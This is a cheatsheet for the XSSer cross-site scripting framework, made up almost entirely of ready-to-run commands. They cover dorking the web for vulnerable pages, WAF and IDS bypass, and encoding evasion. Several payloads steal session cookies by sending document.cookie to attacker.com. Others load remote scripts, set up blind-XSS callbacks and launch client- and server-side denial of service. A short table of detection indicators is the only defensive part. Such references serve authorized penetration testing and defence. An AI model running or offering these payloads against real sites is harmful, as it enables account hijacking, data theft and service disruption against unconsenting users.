# XSSer Cheatsheet — Cross-Site Scripting Framework

## Quick Start

```bash
# Basic URL test
xsser -u "http://target.example.com/search.php?q=XSS"

# Full site audit
xsser --all "http://target.example.com/"

# GUI mode
xsser --gtk
```

## Target Selection

### Single URL
```bash
xsser -u "http://target.example.com/page.php?param=XSS"
```

### GET Parameter
```bash
xsser -u "http://target.example.com/page.php" -g "id=XSS"
```

### POST Parameter
```bash
xsser -u "http://target.example.com/login.php" -p "user=XSS&pass=test"
```

### URLs from File
```bash
xsser -i urls.txt -g "q=XSS"
```

### Full Site Crawl
```bash
xsser --all "http://target.example.com/"
xsser --all "http://target.example.com/" -c 200 --Cw 3
```

### Search Engine Dorking
```bash
xsser -d "site:target.example.com inurl:php" --De=DuckDuckGo
xsser -d "inurl:view.php?id=" --Da
```

## Payload Injection

### Default Vectors
```bash
xsser -u "http://target.example.com/search.php?q=XSS"
```

### Custom Payload
```bash
xsser -u "http://target.example.com/search.php?q=XSS" --payload "<script>alert(1)</script>"
```

### Auto Mode (All 1293 Vectors)
```bash
xsser -u "http://target.example.com/search.php?q=XSS" --auto
```

### Limit Vector Count
```bash
xsser -u "http://target.example.com/search.php?q=XSS" --auto --auto-set=100
```

### Random Order
```bash
xsser -u "http://target.example.com/search.php?q=XSS" --auto --auto-random
```

### Only INFO Vectors
```bash
xsser -u "http://target.example.com/search.php?q=XSS" --auto --auto-info
```

## WAF/IDS Bypass

```bash
# PHPIDS
xsser -u "URL?q=XSS" --Phpids0.6.5
xsser -u "URL?q=XSS" --Phpids0.7

# Imperva Incapsula
xsser -u "URL?q=XSS" --Imperva

# ModSecurity
xsser -u "URL?q=XSS" --Modsec

# Barracuda WAF
xsser -u "URL?q=XSS" --Barracuda

# F5 BIG-IP
xsser -u "URL?q=XSS" --F5bigip

# Sucuri WAF
xsser -u "URL?q=XSS" --Sucuri

# WebKnight
xsser -u "URL?q=XSS" --Webknight

# QuickDefense
xsser -u "URL?q=XSS" --Quickdefense
```

## Encoding Techniques

```bash
# String.fromCharCode
xsser -u "URL?q=XSS" --Str

# Unescape
xsser -u "URL?q=XSS" --Une

# Mixed (Str + Une)
xsser -u "URL?q=XSS" --Mix

# Decimal
xsser -u "URL?q=XSS" --Dec

# Hexadecimal
xsser -u "URL?q=XSS" --Hex

# Hex with semicolons
xsser -u "URL?q=XSS" --Hes

# DWORD IP encoding
xsser -u "URL?q=XSS" --Dwo

# Octal IP encoding
xsser -u "URL?q=XSS" --Doo

# Character encoding mutations (chain)
xsser -u "URL?q=XSS" --Cem="Mix,Une,Str,Hex"
```

## Special Techniques

```bash
# Cookie injection
xsser -u "URL?q=XSS" --Coo

# Cross-Site Agent Scripting
xsser -u "URL?q=XSS" --Xsa

# Cross-Site Referer Scripting
xsser -u "URL?q=XSS" --Xsr

# Data Control Protocol
xsser -u "URL?q=XSS" --Dcp

# DOM-based XSS
xsser -u "URL?q=XSS" --Dom

# HTTP Response Splitting (Induced)
xsser -u "URL?q=XSS" --Ind
```

## Checker Systems

```bash
# Heuristic check
xsser -u "URL?q=XSS" --heuristic

# Hash check (reflection test)
xsser -u "URL?q=XSS" --hash

# Blind XSS
xsser -u "URL?q=XSS" --checkaturl="http://attacker.com/blind" --checkmethod=POST

# Reverse check
xsser -u "URL?q=XSS" --reverse-check
```

## Final Injection Payloads

```bash
# Custom final payload
xsser -u "URL?q=XSS" --Fp="alert(document.domain)"

# Cookie theft
xsser -u "URL?q=XSS" --Fp="document.location='http://attacker.com/steal?c='+document.cookie"

# Remote script
xsser -u "URL?q=XSS" --Fr="http://attacker.com/exploit.js"

# Anchor stealth (DOM shadows)
xsser -u "URL?q=XSS" --Fp="alert(1)" --Anchor

# Base64 META tag
xsser -u "URL?q=XSS" --Fp="alert(1)" --B64

# onMouseMove event
xsser -u "URL?q=XSS" --Fp="alert(1)" --Onm

# Iframe injection
xsser -u "URL?q=XSS" --Fp="http://attacker.com/payload" --Ifr

# Client-side DoS
xsser -u "URL?q=XSS" --Fp="while(1){}" --Dos

# Server-side DoS
xsser -u "URL?q=XSS" --Fp="payload" --Doss
```

## Request Configuration

```bash
# Cookie
xsser -u "URL?q=XSS" --cookie="session=abc123"

# User-Agent
xsser -u "URL?q=XSS" --user-agent="Mozilla/5.0"

# Custom headers
xsser -u "URL?q=XSS" --headers="X-Custom: value"

# X-Forwarded-For (random IP)
xsser -u "URL?q=XSS" --xforw

# X-Client-IP (random IP)
xsser -u "URL?q=XSS" --xclient

# HTTP Basic auth
xsser -u "URL?q=XSS" --auth-type=Basic --auth-cred="user:pass"

# HTTP Digest auth
xsser -u "URL?q=XSS" --auth-type=Digest --auth-cred="user:pass"

# Proxy
xsser -u "URL?q=XSS" --proxy="http://localhost:8080"

# Tor
xsser -u "URL?q=XSS" --proxy="http://localhost:8118" --check-tor

# Ignore system proxy
xsser -u "URL?q=XSS" --ignore-proxy

# Timeout
xsser -u "URL?q=XSS" --timeout=60

# Retries
xsser -u "URL?q=XSS" --retries=3

# Threads
xsser -u "URL?q=XSS" --threads=10

# Delay between requests
xsser -u "URL?q=XSS" --delay=2

# Follow redirects
xsser -u "URL?q=XSS" --follow-redirects --follow-limit=10
```

## Crawler Configuration

```bash
# Crawl 50 URLs
xsser -u "http://target.example.com/" -c 50

# Deep crawl (level 3)
xsser -u "http://target.example.com/" -c 50 --Cw 3

# Local URLs only
xsser -u "http://target.example.com/" -c 50 --Cl
```

## Reporting

```bash
# Save to file (XSSreport.raw)
xsser -u "URL?q=XSS" --save

# XML export
xsser -u "URL?q=XSS" --xml=xss_results.xml

# Silent mode (no console output)
xsser -u "URL?q=XSS" --save --silent
```

## Special Features

```bash
# Create image with XSS
xsser --imx=malicious.png

# Create flash with XSS
xsser --fla=malicious.swf

# Cross-Site Tracing (XST)
xsser --xst="http://target.example.com/"

# Update to latest version
xsser --update
```

## Common Workflows

### Quick XSS Test
```bash
xsser -u "http://target.example.com/search.php?q=XSS" -v
```

### WAF Bypass Test
```bash
xsser -u "http://target.example.com/search.php?q=XSS" --auto --Modsec --Imperva --Phpids0.7 -v
```

### Full Site Audit
```bash
xsser --all "http://target.example.com/" -c 200 --Cw 3 --auto -v --xml=report.xml --save
```

### Blind XSS Setup
```bash
xsser -u "http://target.example.com/comment.php" -p "comment=XSS" \
  --checkaturl="http://attacker.com/callback" --checkmethod=POST --Fp="new Image().src='http://attacker.com/blind?c='+document.cookie" -v
```

### DOM XSS Test
```bash
xsser -u "http://target.example.com/page.php#q=XSS" --Dom -v
```

### Cookie Theft
```bash
xsser -u "http://target.example.com/search.php?q=XSS" \
  --Fp="new Image().src='http://attacker.com/steal?c='+document.cookie" \
  --Str --Hex -v
```

## Output Reference

| Format | Flag | Description |
|--------|------|-------------|
| Raw | `--save` | XSSreport.raw |
| XML | `--xml=file.xml` | XML format |
| Console | `-v` | Verbose output |
| Statistics | `-s` | Advanced stats |
| Silent | `--silent` | No console output |

## Encoding Quick Reference

| Flag | Method | Example Output |
|------|--------|----------------|
| `--Str` | String.fromCharCode | `String.fromCharCode(60,115,99,114,105,112,116,62)` |
| `--Une` | Unescape | `%3Cscript%3E` |
| `--Mix` | Str + Une | Mixed encoding |
| `--Dec` | Decimal | `&#60;&#115;&#99;` |
| `--Hex` | Hexadecimal | `0x3c0x730x63` |
| `--Hes` | Hex + Semicolons | `0x3c;0x73;0x63;` |
| `--Dwo` | DWORD IP | `2130706433` |
| `--Doo` | Octal IP | `0177.0.0.1` |

## Detection Indicators

| Indicator | Where to Look |
|-----------|---------------|
| XSSer User-Agent | Server access logs |
| Encoded payloads | WAF/IDS logs |
| High request volume | Network monitoring |
| `XSS` keyword in URL | Proxy logs |
| Callback requests | Attacker infrastructure logs |

## Quick Reference

| Category | Flag | Purpose |
|----------|------|---------|
| Target | `-u` | URL to test |
| Target | `-g` | GET parameter |
| Target | `-p` | POST parameter |
| Target | `--all` | Full site audit |
| Target | `-i` | Read URLs from file |
| Target | `-d` | Search engine dork |
| Payload | `--auto` | All vectors |
| Payload | `--payload` | Custom payload |
| Bypass | `--Modsec` | ModSecurity bypass |
| Bypass | `--Imperva` | Imperva bypass |
| Bypass | `--Phpids0.7` | PHPIDS bypass |
| Encode | `--Str` | String.fromCharCode |
| Encode | `--Hex` | Hexadecimal |
| Encode | `--Mix` | Mixed encoding |
| Technique | `--Dom` | DOM-based XSS |
| Technique | `--Coo` | Cookie injection |
| Technique | `--Xsa` | Agent scripting |
| Output | `--save` | Save report |
| Output | `--xml` | XML report |
| Output | `-v` | Verbose |
